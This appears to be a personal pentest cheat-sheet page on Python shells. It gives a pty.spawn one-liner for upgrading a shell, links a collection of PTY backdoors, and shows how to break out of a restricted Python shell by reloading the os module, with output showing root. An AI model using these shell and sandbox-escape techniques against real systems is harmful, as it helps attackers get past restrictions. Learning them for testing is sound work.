---
layout: default
title: Python 
parent: Shells / Reverse Shells
grand_parent: security stuff
nav_order: 2
---

1. TOC
{:toc}

## Shells

### one-liner 
```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

### PTY Backdoors
- <https://github.com/infodox/python-pty-shells>

### Escaping Restricted Shells
#### Example One
- below is an example of a sys admin overwriting the builtin 'os' module in memory to establish a 'restricted' shell   
```python
>>> import sys
>>> sys.modules['os'].system = lambda *x,**y:"STOP HACKING!!!"
>>> sys.modules['os'].popup = lambda *x,**y:"STOP HACKING!!!"
>>> del sys
>>> import os
>>> os.system("ls")
'STOP HACKING!!!'
```
- demonstrated below is how to escape the above scenario (reload the os module)  
```python
>>> import importlib
>>> importlib.reload(os)
module 'os' from '/usr/lib/python3.7/os.py'
>>> os.system("id")
uid=0(root) gid=0(root) groups=0(root) 
0
```

---


